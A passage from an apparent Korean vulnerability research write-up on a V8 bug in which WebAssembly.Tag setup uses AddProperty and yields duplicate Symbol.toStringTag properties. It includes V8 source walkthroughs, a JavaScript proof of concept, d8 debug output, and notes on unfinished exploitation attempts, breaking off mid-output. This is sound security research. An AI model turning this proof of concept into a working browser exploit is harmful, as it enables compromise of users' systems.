            <span class="n">V</span><span class="p">(</span><span class="n">JS_GLOBAL_OBJECT_TYPE</span><span class="p">,</span> <span class="mi">267</span><span class="p">)</span> \
            <span class="n">V</span><span class="p">(</span><span class="n">JS_GLOBAL_PROXY_TYPE</span><span class="p">,</span> <span class="mi">268</span><span class="p">)</span> \
            <span class="n">V</span><span class="p">(</span><span class="n">JS_MODULE_NAMESPACE_TYPE</span><span class="p">,</span> <span class="mi">269</span><span class="p">)</span> \
            <span class="n">V</span><span class="p">(</span><span class="n">JS_SPECIAL_API_OBJECT_TYPE</span><span class="p">,</span> <span class="mi">1040</span><span class="p">)</span> \
          <span class="n">V</span><span class="p">(</span><span class="n">LAST_JS_SPECIAL_OBJECT_TYPE</span><span class="p">,</span> <span class="mi">1040</span><span class="p">)</span> \
</code></pre></div></div>

<p>따라서, WebAssembly 객체가 holder인 경우에는 special 하지 않고, global 에서 WebAssembly 객체를 찾는 경우에는 holder가 special 하다. special한 경우 LookupInSpecialHolder, 아닐 경우 LookupInRegularHolder가 호출된다. LookupInSpecialHolder의 경우 몇 가지 특수 처리하는 루틴이 존재하며 그것을 제외한 경우에는 결국 LookupInRegularHolder를 호출한다.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">template</span> <span class="o">&lt;</span><span class="kt">bool</span> <span class="n">is_element</span><span class="p">&gt;</span>
<span class="n">LookupIterator</span><span class="o">::</span><span class="n">State</span> <span class="n">LookupIterator</span><span class="o">::</span><span class="n">LookupInRegularHolder</span><span class="p">(</span>
    <span class="n">Map</span> <span class="k">const</span> <span class="n">map</span><span class="p">,</span> <span class="n">JSReceiver</span> <span class="k">const</span> <span class="n">holder</span><span class="p">)</span> <span class="p">{</span>
			<span class="p">...</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">is_element</span> <span class="o">&amp;&amp;</span> <span class="n">IsElement</span><span class="p">(</span><span class="n">holder</span><span class="p">))</span> <span class="p">{</span>
			<span class="p">...</span>
  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">map</span><span class="p">.</span><span class="n">is_dictionary_map</span><span class="p">())</span> <span class="p">{</span>
    <span class="n">DescriptorArray</span> <span class="n">descriptors</span> <span class="o">=</span> <span class="n">map</span><span class="p">.</span><span class="n">instance_descriptors</span><span class="p">(</span><span class="n">isolate_</span><span class="p">);</span>
    <span class="n">number_</span> <span class="o">=</span> <span class="n">descriptors</span><span class="p">.</span><span class="n">SearchWithCache</span><span class="p">(</span><span class="n">isolate_</span><span class="p">,</span> <span class="o">*</span><span class="n">name_</span><span class="p">,</span> <span class="n">map</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">number_</span><span class="p">.</span><span class="n">is_not_found</span><span class="p">())</span> <span class="k">return</span> <span class="n">NotFound</span><span class="p">(</span><span class="n">holder</span><span class="p">);</span>
    <span class="n">property_details_</span> <span class="o">=</span> <span class="n">descriptors</span><span class="p">.</span><span class="n">GetDetails</span><span class="p">(</span><span class="n">number_</span><span class="p">);</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
			<span class="p">...</span>
  <span class="p">}</span>
  <span class="n">has_property_</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
  <span class="k">switch</span> <span class="p">(</span><span class="n">property_details_</span><span class="p">.</span><span class="n">kind</span><span class="p">())</span> <span class="p">{</span>
    <span class="k">case</span> <span class="n">v8</span><span class="o">::</span><span class="n">internal</span><span class="o">::</span><span class="n">PropertyKind</span><span class="o">::</span><span class="n">kData</span><span class="p">:</span>
      <span class="k">return</span> <span class="n">DATA</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">v8</span><span class="o">::</span><span class="n">internal</span><span class="o">::</span><span class="n">PropertyKind</span><span class="o">::</span><span class="n">kAccessor</span><span class="p">:</span>
      <span class="k">return</span> <span class="n">ACCESSOR</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="n">UNREACHABLE</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div></div>

<p>element인 경우, dictionary인 경우와 아닌 경우 이렇게 나누어서 처리한다. 여기서는 element가 아니고 dictionary가 아닌 경우를 보자. 우선, map에서 descriptor array를 가져오고 이를 통해 name이 속한 index number를 찾는다(SearchWithCache). 못 찾은 경우 NOT_FOUND, 찾았을 경우 has_property_= true 및 DATA 혹은 ACCESSOR를 리턴한다.</p>

<p>Descriptor array는 추후에 자세히 분석하도록 하고, 여기서는 Start 내에서 NextInternal로 이어지는 코드 흐름을 분석하자.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">template</span> <span class="o">&lt;</span><span class="kt">bool</span> <span class="n">is_element</span><span class="p">&gt;</span>
<span class="kt">void</span> <span class="n">LookupIterator</span><span class="o">::</span><span class="n">NextInternal</span><span class="p">(</span><span class="n">Map</span> <span class="n">map</span><span class="p">,</span> <span class="n">JSReceiver</span> <span class="n">holder</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">do</span> <span class="p">{</span>
    <span class="n">JSReceiver</span> <span class="n">maybe_holder</span> <span class="o">=</span> <span class="n">NextHolder</span><span class="p">(</span><span class="n">map</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">maybe_holder</span><span class="p">.</span><span class="n">is_null</span><span class="p">())</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">interceptor_state_</span> <span class="o">==</span> <span class="n">InterceptorState</span><span class="o">::</span><span class="n">kSkipNonMasking</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">RestartLookupForNonMaskingInterceptors</span><span class="o">&lt;</span><span class="n">is_element</span><span class="o">&gt;</span><span class="p">();</span>
        <span class="k">return</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="n">state_</span> <span class="o">=</span> <span class="n">NOT_FOUND</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">holder</span> <span class="o">!=</span> <span class="o">*</span><span class="n">holder_</span><span class="p">)</span> <span class="n">holder_</span> <span class="o">=</span> <span class="n">handle</span><span class="p">(</span><span class="n">holder</span><span class="p">,</span> <span class="n">isolate_</span><span class="p">);</span>
      <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">holder</span> <span class="o">=</span> <span class="n">maybe_holder</span><span class="p">;</span>
    <span class="n">map</span> <span class="o">=</span> <span class="n">holder</span><span class="p">.</span><span class="n">map</span><span class="p">(</span><span class="n">isolate_</span><span class="p">);</span>
    <span class="n">state_</span> <span class="o">=</span> <span class="n">LookupInHolder</span><span class="o">&lt;</span><span class="n">is_element</span><span class="o">&gt;</span><span class="p">(</span><span class="n">map</span><span class="p">,</span> <span class="n">holder</span><span class="p">);</span>
  <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="n">IsFound</span><span class="p">());</span>

  <span class="n">holder_</span> <span class="o">=</span> <span class="n">handle</span><span class="p">(</span><span class="n">holder</span><span class="p">,</span> <span class="n">isolate_</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>NextHolder는 프로토타입 체인을 따라 바로 상위 프로토타입 객체를 다음 holder로서 찾는다. 즉, 프로토타입 체인을 따라 do-while 구문을 통해 계속 탐색한다.</p>

<p>즉, LookupIterator 객체 생성만으로도 일단 객체가 프로토타입 체인 상 존재하는지를 확인하는 과정을 거치게 된다. 위 과정에서 setter 또한 찾아지며 PropertyKind::kAccessor 로서 return ACCESSOR; 로 리턴된다.</p>

<hr />

<p>번외로 흥미로운 점 하나. 어떤 객체가 다른 객체의 __proto__가 되는 순간 dictionary 타입으로 바뀌는 듯 하다. poc 코드에서</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">%</span><span class="nx">DebugPrint</span><span class="p">(</span><span class="nx">object_1</span><span class="p">);</span>
<span class="nx">object_2</span><span class="p">.</span><span class="nx">__proto__</span> <span class="o">=</span> <span class="nx">object_1</span><span class="p">;</span>
<span class="o">%</span><span class="nx">DebugPrint</span><span class="p">(</span><span class="nx">object_1</span><span class="p">);</span>
</code></pre></div></div>

<p>object_1을 __proto__에 대입하기 전/후를 비교해보면</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DebugPrint: 0x86d0004b969: [JS_OBJECT_TYPE]
 - map: 0x086d00207da1 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]
			...
DebugPrint: 0x86d0004b969: [JS_OBJECT_TYPE]
 - map: 0x086d00207e19 &lt;Map(HOLEY_ELEMENTS)&gt; [DictionaryProperties]
</code></pre></div></div>

<p>위와 같이 in-place로(객체 주소값 변동 없이) dictionary 타입으로 바뀜. __proto__가 아닌 일반 프로퍼티(예: <code class="language-plaintext highlighter-rouge">object_2.qwerasdf = object_1;</code>)에 대입하는 경우에는 dictionary로 바뀌지 않는다.</p>

<hr />

<p>setter를 찾은 경우 SetProperty의 이후 동작 분석.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Maybe</span><span class="o">&lt;</span><span class="kt">bool</span><span class="o">&gt;</span> <span class="n">Object</span><span class="o">::</span><span class="n">SetProperty</span><span class="p">(</span><span class="n">LookupIterator</span><span class="o">*</span> <span class="n">it</span><span class="p">,</span> <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">value</span><span class="p">,</span>
                                <span class="n">StoreOrigin</span> <span class="n">store_origin</span><span class="p">,</span>
                                <span class="n">Maybe</span><span class="o">&lt;</span><span class="n">ShouldThrow</span><span class="o">&gt;</span> <span class="n">should_throw</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">it</span><span class="o">-&gt;</span><span class="n">IsFound</span><span class="p">())</span> <span class="p">{</span>
    <span class="kt">bool</span> <span class="n">found</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
    <span class="n">Maybe</span><span class="o">&lt;</span><span class="kt">bool</span><span class="o">&gt;</span> <span class="n">result</span> <span class="o">=</span>
        <span class="n">SetPropertyInternal</span><span class="p">(</span><span class="n">it</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">should_throw</span><span class="p">,</span> <span class="n">store_origin</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">found</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">found</span><span class="p">)</span> <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CheckContextualStoreToJSGlobalObject</span><span class="p">(</span><span class="n">it</span><span class="p">,</span> <span class="n">should_throw</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">return</span> <span class="n">Nothing</span><span class="o">&lt;</span><span class="kt">bool</span><span class="o">&gt;</span><span class="p">();</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">AddDataProperty</span><span class="p">(</span><span class="n">it</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">NONE</span><span class="p">,</span> <span class="n">should_throw</span><span class="p">,</span> <span class="n">store_origin</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>it-&gt;IsFound()로 인해 SetPropertyInternal로 들어간다. 찾지 못한 경우에는 AddDataProperty를 호출함을 나중을 위해 기억해두도록 하자.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      <span class="k">case</span> <span class="n">LookupIterator</span><span class="o">::</span><span class="n">ACCESSOR</span><span class="p">:</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">it</span><span class="o">-&gt;</span><span class="n">IsReadOnly</span><span class="p">())</span> <span class="p">{</span>
          <span class="k">return</span> <span class="n">WriteToReadOnlyProperty</span><span class="p">(</span><span class="n">it</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">should_throw</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">accessors</span> <span class="o">=</span> <span class="n">it</span><span class="o">-&gt;</span><span class="n">GetAccessors</span><span class="p">();</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">accessors</span><span class="o">-&gt;</span><span class="n">IsAccessorInfo</span><span class="p">()</span> <span class="o">&amp;&amp;</span>
            <span class="o">!</span><span class="n">it</span><span class="o">-&gt;</span><span class="n">HolderIsReceiverOrHiddenPrototype</span><span class="p">()</span> <span class="o">&amp;&amp;</span>
            <span class="n">AccessorInfo</span><span class="o">::</span><span class="n">cast</span><span class="p">(</span><span class="o">*</span><span class="n">accessors</span><span class="p">).</span><span class="n">is_special_data_property</span><span class="p">())</span> <span class="p">{</span>
          <span class="o">*</span><span class="n">found</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
          <span class="k">return</span> <span class="n">Nothing</span><span class="o">&lt;</span><span class="kt">bool</span><span class="o">&gt;</span><span class="p">();</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="n">SetPropertyWithAccessor</span><span class="p">(</span><span class="n">it</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">should_throw</span><span class="p">);</span>
      <span class="p">}</span>
</code></pre></div></div>

<p>SetPropertyInternal에서는 ACCESSOR의 경우에 대해 위와 같이 처리하며 결국 SetPropertyWithAccessor(이 함수도 크고 복잡하다) 내에서 setter를 찾아서 프로퍼티를 설정한다. 이 분석은 여기까지만 하고 마무리.</p>

<h3 id="setupconstructor">SetupConstructor</h3>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="n">WasmJs</span><span class="o">::</span><span class="n">InstallConditionalFeatures</span><span class="p">(</span><span class="n">Isolate</span><span class="o">*</span> <span class="n">isolate</span><span class="p">,</span>
                                        <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Context</span><span class="o">&gt;</span> <span class="n">context</span><span class="p">)</span> <span class="p">{</span>
			<span class="p">...</span>
    <span class="n">Handle</span><span class="o">&lt;</span><span class="n">JSObject</span><span class="o">&gt;</span> <span class="n">tag_proto</span> <span class="o">=</span>
        <span class="n">SetupConstructor</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="n">tag_constructor</span><span class="p">,</span> <span class="n">i</span><span class="o">::</span><span class="n">WASM_TAG_OBJECT_TYPE</span><span class="p">,</span>
                         <span class="n">WasmTagObject</span><span class="o">::</span><span class="n">kHeaderSize</span><span class="p">,</span> <span class="s">"WebAssembly.Tag"</span><span class="p">);</span>
			<span class="p">...</span>
<span class="p">}</span>


<span class="n">Handle</span><span class="o">&lt;</span><span class="n">JSObject</span><span class="o">&gt;</span> <span class="n">SetupConstructor</span><span class="p">(</span><span class="n">Isolate</span><span class="o">*</span> <span class="n">isolate</span><span class="p">,</span>
                                  <span class="n">Handle</span><span class="o">&lt;</span><span class="n">JSFunction</span><span class="o">&gt;</span> <span class="n">constructor</span><span class="p">,</span>
                                  <span class="n">InstanceType</span> <span class="n">instance_type</span><span class="p">,</span> <span class="kt">int</span> <span class="n">instance_size</span><span class="p">,</span>
                                  <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">name</span> <span class="o">=</span> <span class="nb">nullptr</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">SetDummyInstanceTemplate</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="n">constructor</span><span class="p">);</span>
  <span class="n">JSFunction</span><span class="o">::</span><span class="n">EnsureHasInitialMap</span><span class="p">(</span><span class="n">constructor</span><span class="p">);</span>
  <span class="n">Handle</span><span class="o">&lt;</span><span class="n">JSObject</span><span class="o">&gt;</span> <span class="n">proto</span><span class="p">(</span><span class="n">JSObject</span><span class="o">::</span><span class="n">cast</span><span class="p">(</span><span class="n">constructor</span><span class="o">-&gt;</span><span class="n">instance_prototype</span><span class="p">()),</span>
                         <span class="n">isolate</span><span class="p">);</span>
  <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Map</span><span class="o">&gt;</span> <span class="n">map</span> <span class="o">=</span> <span class="n">isolate</span><span class="o">-&gt;</span><span class="n">factory</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">NewMap</span><span class="p">(</span><span class="n">instance_type</span><span class="p">,</span> <span class="n">instance_size</span><span class="p">);</span>
  <span class="n">JSFunction</span><span class="o">::</span><span class="n">SetInitialMap</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="n">constructor</span><span class="p">,</span> <span class="n">map</span><span class="p">,</span> <span class="n">proto</span><span class="p">);</span>
  <span class="k">constexpr</span> <span class="n">PropertyAttributes</span> <span class="n">ro_attributes</span> <span class="o">=</span>
      <span class="k">static_cast</span><span class="o">&lt;</span><span class="n">PropertyAttributes</span><span class="o">&gt;</span><span class="p">(</span><span class="n">DONT_ENUM</span> <span class="o">|</span> <span class="n">READ_ONLY</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">name</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">JSObject</span><span class="o">::</span><span class="n">AddProperty</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="n">proto</span><span class="p">,</span>
                          <span class="n">isolate</span><span class="o">-&gt;</span><span class="n">factory</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">to_string_tag_symbol</span><span class="p">(),</span>
                          <span class="n">v8_str</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="n">name</span><span class="p">),</span> <span class="n">ro_attributes</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">proto</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>JSObject::AddProperty가 있다는 점에 주목하자. AddProperty는 CVE-2021-30561 에서도 알 수 있듯이 동일한 이름의 프로퍼티 중복 여부를 체크하지 않아 잘못된 상태의 객체를 만들어 낼 수 있다. 다음은 <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2197">https://bugs.chromium.org/p/project-zero/issues/detail?id=2197</a> 에서 발췌한 것이다.</p>

<blockquote>
  <p>This is problematic because the <code class="language-plaintext highlighter-rouge">Exception</code> constructor is assigned via the service function <code class="language-plaintext highlighter-rouge">AddProperty</code>[3]. Unlike the regular <code class="language-plaintext highlighter-rouge">SetProperty</code>, <code class="language-plaintext highlighter-rouge">AddProperty</code> doesn’t check whether a property with the same name is already defined on the receiver. As a result, the receiver may end up in a corrupted state where two of its properties have the same name. Moreover, if the receiver’s map is deprecated by the time <code class="language-plaintext highlighter-rouge">AddProperty</code> is called, the function will create a new property descriptor, but modify the value of the existing property without updating its descriptor.</p>
</blockquote>

<p>AddProperty를 통해 WebAssembly.Tag에 설치될 함수의 프로토타입에 Symbol.toStringTag 심볼에 대해 “WebAssembly.Tag” 라는 문자열을 설치한다. 위 구문이 실행되기 전에(즉, setter에서) WebAssembly.Tag.prototype[Symbol.toStringTag] 프로퍼티를 추가해 둘 경우 동일한 심볼에 대해 중복하여 프로퍼티가 설치되도록 할 수 있다.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">////////////// PoC //////////////</span>
<span class="kd">let</span> <span class="nx">array</span> <span class="o">=</span> <span class="p">[</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">2.2</span><span class="p">];</span>

<span class="kd">let</span> <span class="nx">object_1</span> <span class="o">=</span> <span class="p">{};</span>
<span class="kd">let</span> <span class="nx">object_2</span> <span class="o">=</span> <span class="p">{};</span>
<span class="nx">object_1</span><span class="p">.</span><span class="nx">__defineSetter__</span><span class="p">(</span><span class="dl">"</span><span class="s2">Tag</span><span class="dl">"</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">setter!!</span><span class="dl">"</span><span class="p">);</span>
  <span class="c1">//val.prototype[Symbol.toStringTag] = array;</span>
  <span class="nb">Object</span><span class="p">.</span><span class="nx">defineProperty</span><span class="p">(</span><span class="nx">val</span><span class="p">.</span><span class="nx">prototype</span><span class="p">,</span> <span class="nb">Symbol</span><span class="p">.</span><span class="nx">toStringTag</span><span class="p">,</span> <span class="p">{</span><span class="na">value</span><span class="p">:</span> <span class="nx">array</span><span class="p">,</span> <span class="na">configurable</span><span class="p">:</span> <span class="kc">true</span><span class="p">});</span>
  <span class="k">this</span><span class="p">.</span><span class="nx">_Tag</span> <span class="o">=</span> <span class="nx">val</span><span class="p">;</span>
<span class="p">});</span>
<span class="nx">object_2</span><span class="p">.</span><span class="nx">__proto__</span> <span class="o">=</span> <span class="nx">object_1</span><span class="p">;</span>

<span class="nx">WebAssembly</span> <span class="o">=</span> <span class="nx">object_2</span><span class="p">;</span>
<span class="nx">d8</span><span class="p">.</span><span class="nx">test</span><span class="p">.</span><span class="nx">installConditionalFeatures</span><span class="p">();</span>

<span class="o">%</span><span class="nx">DebugPrint</span><span class="p">(</span><span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">_Tag</span><span class="p">.</span><span class="nx">prototype</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">_Tag</span><span class="p">.</span><span class="nx">prototype</span><span class="p">[</span><span class="nb">Symbol</span><span class="p">.</span><span class="nx">toStringTag</span><span class="p">]);</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="k">delete</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">_Tag</span><span class="p">.</span><span class="nx">prototype</span><span class="p">[</span><span class="nb">Symbol</span><span class="p">.</span><span class="nx">toStringTag</span><span class="p">]);</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">_Tag</span><span class="p">.</span><span class="nx">prototype</span><span class="p">[</span><span class="nb">Symbol</span><span class="p">.</span><span class="nx">toStringTag</span><span class="p">]);</span>
<span class="o">%</span><span class="nx">DebugPrint</span><span class="p">(</span><span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">_Tag</span><span class="p">.</span><span class="nx">prototype</span><span class="p">);</span>
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>############ LOG ############
DEBUG:: Shell::InstallConditionalFeatures
DEBUG:: WasmJs::InstallConditionalFeatures starts!
DEBUG:: WasmJs::InstallConditionalFeatures has_eh()
DEBUG:: WasmJs::InstallConditionalFeatures, JSObject? 1 ,  JSProxy? 0
setter!!
DEBUG:: SetupConstructor starts! name: WebAssembly.Tag
DEBUG:: SetupConstructor, let's add property!
DEBUG:: WasmJs::InstallConditionalFeatures, finished!
DebugPrint: 0x34a90004b19d: [JS_OBJECT_TYPE]
 - map: 0x34a900207e69 &lt;Map(HOLEY_ELEMENTS)&gt; [DictionaryProperties]
 - prototype: 0x34a9001c42f5 &lt;Object map = 0x34a9002021e9&gt;
 - elements: 0x34a900002261 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
 - properties: 0x34a90004b1d5 &lt;NameDictionary[17]&gt;
 - All own properties (excluding elements): {
   constructor: 0x34a9001d3af5 &lt;JSFunction Tag (sfi = 0x34a9001d3ad1)&gt; (data, dict_index: 1, attrs: [W_C])
   0x34a900005e39 &lt;Symbol: Symbol.toStringTag&gt;: 0x34a90004b0a5 &lt;JSArray[2]&gt; (data, dict_index: 2, attrs: [__C])
   0x34a900005e39 &lt;Symbol: Symbol.toStringTag&gt;: 0x34a90004b2bd &lt;String[15]: "WebAssembly.Tag"&gt; (data, dict_index: 3, attrs: [__C])
 }
0x34a900207e69: [Map]
 - type: JS_OBJECT_TYPE
 - instance size: 28
 - inobject properties: 4
 - elements kind: HOLEY_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - dictionary_map
 - may_have_interesting_symbols
 - prototype_map
 - prototype info: 0
 - prototype_validity cell: 0x34a900144519 &lt;Cell value= 1&gt;
 - instance descriptors (own) #0: 0x34a9000021f5 &lt;Other heap object (STRONG_DESCRIPTOR_ARRAY_TYPE)&gt;
 - prototype: 0x34a9001c42f5 &lt;Object map = 0x34a9002021e9&gt;
 - constructor: 0x34a9001c3f09 &lt;JSFunction Object (sfi = 0x34a90015675d)&gt;
 - dependent code: 0x34a9000021e9 &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt;
 - construction counter: 0

1.1,2.2
true
WebAssembly.Tag
DebugPrint: 0x34a90004b19d: [JS_OBJECT_TYPE]
 - map: 0x34a900207e69 &lt;Map(HOLEY_ELEMENTS)&gt; [DictionaryProperties]
 - prototype: 0x34a9001c42f5 &lt;Object map = 0x34a9002021e9&gt;
 - elements: 0x34a900002261 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
 - properties: 0x34a90004b1d5 &lt;NameDictionary[17]&gt;
 - All own properties (excluding elements): {
   constructor: 0x34a9001d3af5 &lt;JSFunction Tag (sfi = 0x34a9001d3ad1)&gt; (data, dict_index: 1, attrs: [W_C])
   0x34a900005e39 &lt;Symbol: Symbol.toStringTag&gt;: 0x34a90004b2bd &lt;String[15]: "WebAssembly.Tag"&gt; (data, dict_index: 3, attrs: [__C])
 }
0x34a900207e69: [Map]
 - type: JS_OBJECT_TYPE
 - instance size: 28
 - inobject properties: 4
 - elements kind: HOLEY_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - dictionary_map
 - may_have_interesting_symbols
 - prototype_map
 - prototype info: 0
 - prototype_validity cell: 0x34a900144519 &lt;Cell value= 1&gt;
 - instance descriptors (own) #0: 0x34a9000021f5 &lt;Other heap object (STRONG_DESCRIPTOR_ARRAY_TYPE)&gt;
 - prototype: 0x34a9001c42f5 &lt;Object map = 0x34a9002021e9&gt;
 - constructor: 0x34a9001c3f09 &lt;JSFunction Object (sfi = 0x34a90015675d)&gt;
 - dependent code: 0x34a9000021e9 &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt;
 - construction counter: 0
</code></pre></div></div>

<h3 id="exploit">exploit?</h3>

<p>몇 가지 시도하다 발견한 점.</p>

<p>30561 과 동일한 방법을 쓰고 싶었으나 prototype 객체가 복사(Object.create 등 활용)가 안됨, 즉 같은 map을 갖는 객체를 새로 만드는 것이 잘 안됨. 또한, dictionary map임.</p>

<p>dictionary map은 deprecated/stable 개념이 없는 듯 하다. 즉, map transition이 없음.</p>

<p>WebAssembly._Tag.prototype이 dictionary map이었는데 turbofan jit 트리거하는 중간에 fast 타입으로 바뀜.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// before JIT
DebugPrint: 0x31820004bd71: [JS_OBJECT_TYPE]
 - map: 0x318200207e91 &lt;Map(HOLEY_ELEMENTS)&gt; [DictionaryProperties]
 - properties: 0x31820004bda9 &lt;NameDictionary[17]&gt;
 - All own properties (excluding elements): {
   0x318200005e39 &lt;Symbol: Symbol.toStringTag&gt;: 0x31820004bf35 &lt;String[15]: "WebAssembly.Tag"&gt; (data, dict_index: 3, attrs: [__C])
   constructor: 0x3182001d40e9 &lt;JSFunction Tag (sfi = 0x3182001d40c5)&gt; (data, dict_index: 1, attrs: [W_C])
   0x318200005e39 &lt;Symbol: Symbol.toStringTag&gt;: 0x31820004bc21 &lt;JSArray[2]&gt; (data, dict_index: 2, attrs: [WEC])
 }
0x318200207e91: [Map]
 - unused property fields: 0
 - dictionary_map
 - prototype_map
 - prototype info: 0
 - instance descriptors (own) #0: 0x3182000021f5 &lt;Other heap object (STRONG_DESCRIPTOR_ARRAY_TYPE)&gt;
 - dependent code: 0x3182000021e9 &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt;

// after JIT
DebugPrint: 0x31820004bd71: [JS_OBJECT_TYPE]
 - map: 0x318200207f31 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]
 - properties: 0x318200003401 &lt;PropertyArray[0]&gt;
 - All own properties (excluding elements): {
    0x31820000447d: [String] in ReadOnlySpace: #constructor: 0x3182001d40e9 &lt;JSFunction Tag (sfi = 0x3182001d40c5)&gt; (const data field 0), location: in-object
    0x318200005e39 &lt;Symbol: Symbol.toStringTag&gt;: 0x31820004bc21 &lt;JSArray[2]&gt; (const data field 1), location: in-object
    0x318200005e39 &lt;Symbol: Symbol.toStringTag&gt;: 0x31820004bf35 &lt;String[15]: "WebAssembly.Tag"&gt; (const data field 2), location: in-object
 }
0x318200207f31: [Map]
 - type: JS_OBJECT_TYPE
 - inobject properties: 4
 - elements kind: HOLEY_ELEMENTS
 - unused property fields: 1
 - enum length: invalid
 - stable_map
 - prototype_map
 - prototype info: 0x3182001d4529 &lt;PrototypeInfo&gt;
 - instance descriptors (own) #3: 0x31820004bfd1 &lt;DescriptorArray[3]&gt;
 - dependent code: 0x31820005e059 &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt;
</code></pre></div></div>

<p>(필요한 내용들만 표시)</p>

<p>setter에서 dictionary 형태를 fast 형태로 바꾸고 나서 Object.create 하면 복사가 되려나? setter 내에서  jit 트리거만 해준 결과</p>

<p>```DebugPrint: 0x34070004be51: [JS_OBJECT_TYPE]</p>
<ul>
  <li>map: 0x340700207f81 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</li>
  <li>prototype: 0x3407001c42f5 <object map="0x3407002021e9"></object></li>
  <li>elements: 0x340700002261 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</li>
  <li>properties: 0x340700003401 &lt;PropertyArray[0]&gt;</li>
  <li>All own properties (excluding elements): {
